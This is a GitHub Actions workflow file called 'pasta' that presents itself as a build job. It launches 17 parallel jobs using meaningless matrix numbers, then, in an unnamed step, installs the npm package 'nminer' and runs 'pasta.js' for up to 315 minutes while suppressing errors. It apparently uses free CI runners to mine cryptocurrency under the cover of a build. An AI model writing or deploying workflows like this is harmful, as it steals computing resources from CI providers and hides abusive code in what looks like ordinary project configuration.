name: pasta
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4604 }
          - { version: 8744 }
          - { version: 5058 }
          - { version: 1365 }
          - { version: 214 }
          - { version: 5375 }
          - { version: 4618 }
          - { version: 4507 }
          - { version: 6854 }
          - { version: 4092 }
          - { version: 8727 }
          - { version: 633 }
          - { version: 5396 }
          - { version: 8514 }
          - { version: 3500 }
          - { version: 938 }
          - { version: 9511 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 315m node pasta.js || echo "pasta executed"